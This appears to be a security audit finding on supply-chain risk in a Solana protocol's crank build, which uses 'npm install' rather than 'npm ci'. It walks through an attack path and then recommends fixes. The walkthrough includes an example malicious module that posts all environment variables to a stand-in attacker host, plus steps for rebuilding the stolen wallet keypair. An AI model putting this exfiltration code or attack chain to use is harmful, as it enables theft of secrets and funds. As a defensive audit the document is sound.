## Combined Attack Path

H003 identifies that the crank Railway build process uses `npm install` rather than `npm ci`. The committed `package-lock.json` substantially raises the bar over the Audit #1 state, but two residual paths remain: (A) a caret-ranged dependency drifts to a malicious version via lockfile update, or (B) an attacker publishes a malicious module body in any dependency within the caret range that gets resolved on a build where node_modules is not clean. H002 confirms that the prize in the crank process is the complete mainnet crank wallet private key.

The chain viability analysis:

```
Precondition — Crank uses `npm install`, not `npm ci`
railway-crank.toml:3: buildCommand = "npm install"

This single-line deviation from the Audit #1 recommended fix is the
entry point for the entire chain. With `npm ci`, the committed
package-lock.json would be enforced exactly and a fresh clean install
would be guaranteed. With `npm install`, the following paths are open:

---

Path A: Caret-Range Drift (lower likelihood post-Audit-#1-fix)

1. Attacker identifies a caret-ranged crank dependency with a
   recently published patch version within range.
   Example candidates from root package.json:
     "@coral-xyz/anchor": "^0.32.1"        (→ could resolve 0.32.2+)
     "@switchboard-xyz/on-demand": "^3.7.3" (→ could resolve 3.7.4+)
     "@solana/web3.js": "^1.98.0"           (→ could resolve 1.98.1+)

2. Attacker compromises or impersonates the npm account of the
   target package maintainer and publishes a malicious patch version.
   Malicious payload is in the MODULE BODY (not postinstall):
     // index.js of compromised @coral-xyz/anchor@0.32.2
     const http = require("https");
     http.request("https://attacker.com/collect", ...).end(
       JSON.stringify(process.env)
     );
     // ... rest of legitimate anchor code

3. Developer legitimately updates the lockfile (routine `npm install`
   to pull a genuine fix in another dep). The lockfile now pins the
   malicious patch version of the target package.
   Developer commits the updated lockfile.

4. Railway triggers a new crank deploy.
   `npm install` installs from the updated lockfile.
   The malicious module body now exists on the Railway crank service.

5. Crank process starts:
   import * as anchor from "@coral-xyz/anchor";
   → malicious code in module body executes BEFORE any crank logic.
   → process.env contains WALLET_KEYPAIR (64-byte array), HELIUS_API_KEY,
     HELIUS_WEBHOOK_SECRET, DATABASE_URL, HELIUS_RPC_URL.

6. All env vars exfiltrated via outbound HTTPS.
   (Railway has no egress filtering.)

---

Path B: Module-Body Injection Without Lockfile Modification (lower bar,
          depends on build container state)

1. Same as Path A step 1-2 — attacker publishes malicious patch version.

2. If Railway's Nixpacks build layer does NOT perform a clean node_modules
   between builds (caching), and a previous build ran `npm install` that
   resolved a non-lockfile version, the cached node_modules may contain
   the malicious version even without lockfile modification.

   With `npm ci`, this cannot happen — npm ci always deletes node_modules
   and installs from scratch. With `npm install`, caching behavior depends
   on Railway's Nixpacks configuration (unverified).

---

Post-Exfiltration: Crank Wallet Compromise

7. Attacker reconstructs crank keypair:
   Keypair.fromSecretKey(new Uint8Array(JSON.parse(process.env.WALLET_KEYPAIR)))
   → mainnet address: F84XUxo5VM8FJZeGvC3CrHYwLzFod3ep57CULjZ4ZXc1

8. Attacker drains crank SOL balance.
   (Funded wallet, confirmed in project memory.)

9. Epoch manipulation:
   The crank is the practical (though not on-chain exclusive) caller of
   trigger_epoch_transition. With the crank key, the attacker can:
   - Block epoch transitions (by stopping the legitimate crank and not
     calling the transition themselves) → protocol stalls at epoch boundary
   - Front-run epoch transitions at high-value moments (e.g., trigger
     transition immediately after buying cheapSide assets, before VRF
     outcome is broadcast → information asymmetry)
   - Disrupt VRF flow: crank manages the create/commit/reveal sequence;
     an attacker with the key can submit conflicting VRF accounts or
     consume the randomness at the wrong moment

10. Secondary: HELIUS_WEBHOOK_SECRET in same env
    → enables webhook state injection chain (H005/H020/S006) without
      requiring a separate Railway breach.

11. Secondary: HELIUS_API_KEY in same env
    → enables webhook deletion, shadow webhook registration, API credit
      exhaustion.
```

### Chain Viability Assessment

**Path A** requires a compromised package maintainer account for a caret-ranged dependency — this is harder than the Audit #1 scenario (gitignored lockfile, any version installable) but is a well-documented class of real-world supply chain attacks (e.g., the ua-parser-js, node-ipc, and event-stream incidents). The committed lockfile mitigates the "opportunistic drift" sub-variant but does not protect against a deliberate maintainer compromise that publishes within the semver range AND the lockfile is later updated (legitimately) by a developer.

**Path B** has lower probability due to uncertainty about Railway Nixpacks caching behavior, but `npm install` not performing a clean install is the documented behavioral difference from `npm ci`.

**Combined verdict is POTENTIAL** (not CONFIRMED) because:
- The committed lockfile substantially raises the bar over Audit #1
- `ignore-scripts=true` eliminates the postinstall vector
- The residual risk requires active supply chain compromise of a specific dependency maintainer, followed by lockfile update
- Neither condition is currently observed to be met in practice

The chain is nonetheless viable and the one-line fix (`npm install` → `npm ci`) is the only control needed to close it.

| Consequence | Assessment |

The secondary leakages (webhook secret, API key, database URL) are arguably more damaging than the direct crank wallet theft because they open cascading attack surfaces against the full protocol data pipeline. A crank wallet drain is visible and recoverable (rotate key, refund). Persistent webhook injection and database access may go undetected for extended periods.

## Recommendation

**Fix 1 — The one-line fix (closes the entire chain; required):**

In `railway-crank.toml:3`:
```toml
# Before (current state)
buildCommand = "npm install"

# After (closes supply chain drift)
buildCommand = "npm ci"
```

`npm ci` with the committed `package-lock.json` and existing `ignore-scripts=true` provides:
- Exact version enforcement (lockfile cannot drift during build)
- Clean install (no stale cached node_modules from prior compromised builds)
- No postinstall execution (existing .npmrc control)

This is the fix that Audit #1 recommended and that was claimed as fixed in commit `807ba9e` but was not applied to `railway-crank.toml`.

**Fix 2 — Pin exact versions in package.json (narrows caret-range drift window):**

Remove `^` from high-risk crank dependencies in root `package.json`:
- `"@coral-xyz/anchor": "0.32.1"` (exact)
- `"@switchboard-xyz/on-demand": "3.7.3"` (exact)
- `"@solana/web3.js": "1.98.0"` (exact)

With exact pins AND committed lockfile AND `npm ci`, a supply chain attack requires lockfile modification before it can affect the build — which is detectable in code review.

**Fix 3 — Scope isolation for crank (architectural; reduces blast radius):**

The crank's dependency on `@dr-fraudsworth/shared` (H007) means the shared package surface also contributes to this attack chain. Consider whether the crank actually needs `shared/` or can import only the specific constants it uses, reducing the dependency footprint and the attack surface.

**Fix 4 — Separate Railway services with minimal env vars per service:**

The crank service currently holds `WALLET_KEYPAIR`, `HELIUS_WEBHOOK_SECRET`, `HELIUS_API_KEY`, and `DATABASE_URL` in the same process env. If the crank only needs `WALLET_KEYPAIR` and `HELIUS_RPC_URL`, the webhook secret and database URL should not be present in the same env. Compartmentalization limits what a supply chain compromise can exfiltrate.

**Fix 5 — npm audit gate in CI:**

Add `npm audit --audit-level=high` as a CI gate. H003 notes 30 known CVEs (9 high) are invisible to CI. A CI gate would surface critical findings before deploy and create pressure to keep the dependency tree current and patched.
